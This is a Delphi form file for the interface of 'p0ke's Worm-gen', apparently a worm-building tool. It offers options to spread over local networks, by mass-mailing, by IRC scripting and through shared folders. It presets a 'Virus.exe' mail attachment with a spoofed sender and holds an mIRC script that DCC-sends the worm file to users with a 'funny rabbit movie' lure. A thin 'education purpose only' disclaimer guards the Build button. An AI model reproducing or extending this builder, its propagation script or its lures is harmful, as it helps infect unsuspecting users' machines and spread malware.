object Form1: TForm1
  Left = 192
  Top = 107
  BorderIcons = [biSystemMenu, biMinimize]
  BorderStyle = bsSingle
  Caption = 'p0ke'#39's Worm-gen'
  ClientHeight = 201
  ClientWidth = 225
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Courier New'
  Font.Style = []
  OldCreateOrder = False
  OnCreate = FormCreate
  PixelsPerInch = 96
  TextHeight = 14
  object Panel1: TPanel
    Left = 0
    Top = 0
    Width = 225
    Height = 169
    TabOrder = 0
    object Label1: TLabel
      Left = 8
      Top = 8
      Width = 89
      Height = 17
      AutoSize = False
      Caption = 'Worm name :'
    end
    object Label2: TLabel
      Left = 8
      Top = 56
      Width = 89
      Height = 17
      AutoSize = False
      Caption = 'Output dir :'
    end
    object Edit1: TEdit
      Left = 16
      Top = 24
      Width = 193
      Height = 20
      Ctl3D = False
      ParentCtl3D = False
      TabOrder = 0
    end
    object Edit2: TEdit
      Left = 16
      Top = 72
      Width = 193
      Height = 20
      Ctl3D = False
      ParentCtl3D = False
      TabOrder = 1
      Text = 'C:\'
    end
  end
  object Button1: TButton
    Left = 160
    Top = 176
    Width = 65
    Height = 25
    Caption = '&Next'
    TabOrder = 1
    OnClick = Button1Click
  end
  object Button2: TButton
    Left = 88
    Top = 176
    Width = 65
    Height = 25
    Caption = '&Back'
    TabOrder = 2
    OnClick = Button2Click
  end
  object Panel2: TPanel
    Left = 232
    Top = 0
    Width = 225
    Height = 169
    TabOrder = 3
    object Label3: TLabel
      Left = 8
      Top = 8
      Width = 65
      Height = 17
      AutoSize = False
      Caption = 'Spread'
    end
    object CheckBox1: TCheckBox
      Left = 8
      Top = 32
      Width = 209
      Height = 17
      Caption = 'Spread local network'
      TabOrder = 0
    end
    object CheckBox2: TCheckBox
      Left = 8
      Top = 64
      Width = 209
      Height = 17
      Caption = 'Spread mass-mailing'
      TabOrder = 1
    end
    object CheckBox3: TCheckBox
      Left = 8
      Top = 96
      Width = 209
      Height = 17
      Caption = 'Spread irc-scripting'
      TabOrder = 2
    end
    object CheckBox4: TCheckBox
      Left = 8
      Top = 128
      Width = 209
      Height = 17
      Caption = 'Spread Share-Dirs dropping'
      TabOrder = 3
    end
    object Button3: TButton
      Left = 176
      Top = 64
      Width = 41
      Height = 17
      Caption = '&Edit'
      TabOrder = 4
      OnClick = Button3Click
    end
    object Button4: TButton
      Left = 176
      Top = 96
      Width = 41
      Height = 17
      Caption = '&Edit'
      TabOrder = 5
      OnClick = Button4Click
    end
  end
  object Panel3: TPanel
    Left = 0
    Top = 208
    Width = 225
    Height = 169
    TabOrder = 4
    object Label4: TLabel
      Left = 8
      Top = 8
      Width = 73
      Height = 17
      AutoSize = False
      Caption = 'Subject :'
      Layout = tlBottom
    end
    object Label5: TLabel
      Left = 8
      Top = 32
      Width = 73
      Height = 17
      AutoSize = False
      Caption = 'Attachment:'
      Layout = tlBottom
    end
    object Label6: TLabel
      Left = 8
      Top = 56
      Width = 73
      Height = 17
      AutoSize = False
      Caption = 'From :'
      Layout = tlBottom
    end
    object Edit3: TEdit
      Left = 88
      Top = 8
      Width = 129
      Height = 20
      Ctl3D = False
      ParentCtl3D = False
      TabOrder = 0
      Text = 'Hello'
    end
    object Edit4: TEdit
      Left = 88
      Top = 32
      Width = 129
      Height = 20
      Ctl3D = False
      ParentCtl3D = False
      TabOrder = 1
      Text = 'Virus.exe'
    end
    object Memo1: TMemo
      Left = 8
      Top = 80
      Width = 209
      Height = 81
      Ctl3D = False
      Lines.Strings = (
        'Im sending you this virus '
        'becouse i really fucking '
        'hate you. :) <3 forever '
        'more // ghandi')
      ParentCtl3D = False
      ScrollBars = ssVertical
      TabOrder = 2
    end
    object Edit5: TEdit
      Left = 88
      Top = 56
      Width = 129
      Height = 20
      Ctl3D = False
      ParentCtl3D = False
      TabOrder = 3
      Text = 'Stfu@Abuse.com'
    end
  end
  object Panel4: TPanel
    Left = 232
    Top = 208
    Width = 225
    Height = 169
    TabOrder = 5
    object Memo2: TMemo
      Left = 8
      Top = 8
      Width = 209
      Height = 153
      Ctl3D = False
      Lines.Strings = (
        '; Dont modify this sciript'
        '; it may crash your system'
        ''
        'on *:LOAD:{'
        ' .dcc send $nick %file%'
        ' .msg $nick its a funny '
        'rabbit movie'
        '}')
      ParentCtl3D = False
      ScrollBars = ssVertical
      TabOrder = 0
    end
  end
  object Panel5: TPanel
    Left = 0
    Top = 384
    Width = 225
    Height = 169
    TabOrder = 6
    object Button5: TButton
      Left = 144
      Top = 128
      Width = 65
      Height = 25
      Caption = '&Build'
      Enabled = False
      Font.Charset = DEFAULT_CHARSET
      Font.Color = clWindowText
      Font.Height = -11
      Font.Name = 'Courier New'
      Font.Style = [fsBold]
      ParentFont = False
      TabOrder = 0
      OnClick = Button5Click
    end
    object CheckBox5: TCheckBox
      Left = 8
      Top = 136
      Width = 129
      Height = 17
      Caption = 'I Accept'
      TabOrder = 1
      OnMouseUp = CheckBox5MouseUp
    end
    object Memo3: TMemo
      Left = 16
      Top = 8
      Width = 193
      Height = 113
      BorderStyle = bsNone
      Color = clBtnFace
      Ctl3D = False
      Lines.Strings = (
        'By pressing "Build" you '
        'accept the full '
        'responsibility for this '
        'program created. '
        'The author cannot be held '
        'responsible for any '
        'actions, or system damage '
        'made by this program.'
        'You have been warned. For '
        'education purpose only.')
      ParentCtl3D = False
      ReadOnly = True
      ScrollBars = ssVertical
      TabOrder = 2
    end
  end
end
